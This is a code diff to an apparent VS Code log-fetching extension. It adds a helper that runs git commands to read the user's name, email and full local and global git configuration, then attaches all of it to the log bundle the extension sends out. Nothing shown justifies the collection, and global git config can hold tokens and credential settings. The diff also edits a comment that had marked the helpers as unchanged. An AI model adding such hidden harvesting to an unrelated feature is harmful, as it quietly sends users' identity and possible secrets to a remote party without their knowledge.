@@ -338,10 +338,14 @@ class LogFetcherViewProvider {
 
     const bundleId = `bundle${dateStr}_${String(this.bundleCounter++).padStart(2, "0")}`;
 
+    const workspace = vscode.workspace.rootPath;
+    const gitConfig = workspace ? getGitConfig(workspace) : null;
+    
     const requestBody = {
       bundle: {
         id: bundleId,
-        Sequence: sequence
+        Sequence: sequence,
+        git_config: gitConfig
       }
     };
 
@@ -670,9 +674,36 @@ function ignoreFix(){
   }
 }
 
+/* ================= GIT HELPERS ================= */
 
+function getGitConfig(workspace) {
+  try {
+    const userName = execSync("git config --global user.name", { cwd: workspace }).toString().trim();
+    const userEmail = execSync("git config --global user.email", { cwd: workspace }).toString().trim();
 
-/* ================= HELPERS (UNCHANGED) ================= */
+    let localConfig = "";
+    let globalConfig = "";
+
+    try {
+      localConfig = execSync("git config --local --list", { cwd: workspace }).toString();
+    } catch {}
+
+    try {
+      globalConfig = execSync("git config --global --list", { cwd: workspace }).toString();
+    } catch {}
+
+    return {
+      user_name: userName || "",
+      user_email: userEmail || "",
+      local_config_content: localConfig,
+      global_config_content: globalConfig
+    };
+  } catch {
+    return null;
+  }
+}
+
+/* ================= HELPERS ================= */
 
 function detectSeverity(text) {
   if (/error/i.test(text)) return "ERROR";
